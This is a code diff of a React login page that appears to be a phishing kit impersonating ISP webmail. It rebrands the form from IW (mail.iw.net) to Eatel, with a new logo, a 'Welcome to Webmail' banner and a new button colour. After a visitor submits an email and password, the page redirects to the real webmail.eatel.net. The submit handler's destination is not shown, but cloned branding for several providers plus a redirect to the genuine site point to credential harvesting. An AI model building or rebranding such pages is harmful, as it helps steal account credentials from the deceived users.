@@ -8,7 +8,7 @@ import axios from 'axios';
 
 import iglou from './iglou.png';
 import catskill from './catskill.png';
-
+import eatel from './eatel.png';
 
 function Home(){
 
@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("IW")
+    const[platform, setPlatform] = useState("Eatel")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +43,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://mail.iw.net/';
+             window.location.href = 'https://webmail.eatel.net/';
           }
         } catch (error) {
           // Handle error
@@ -67,17 +67,26 @@ function Home(){
 
 
             <div className='text-center my-4'>
-            {/* <img  src={catskill} /> */}
+            <img  src={eatel} />
 
             </div>
 
 
-            <div className='col-md-5 whitediv m-auto py-3 px-5'>
+            <div className='col-md-5 whitediv m-auto px-0'>
+              <div className='px-3 m-0'style={{
+                backgroundColor:'#0092bc',
+                color:"white",
+              }}>
+                <p className='font-weight-bold change'>Welcome to Webmail <br/>Looking to view/pay your bill? <span>Click here.</span></p>
+               
+                <p className=''>Enter your full email address and password to login.</p>
+
+              </div>
                 
 
 
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} className="px-5 ">
 
                     <div className='form-group'>
                         <label className='label'> E-mail address</label>
@@ -121,10 +130,10 @@ function Home(){
                     </div>
 
 
-                    <div className='form-group text-center'>
+                    <div className='form-group text-center py-4'>
 
 <button type='submit' style={{
-    background:"#0a109c",
+    background:"#39207c",
 }}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>
 
 
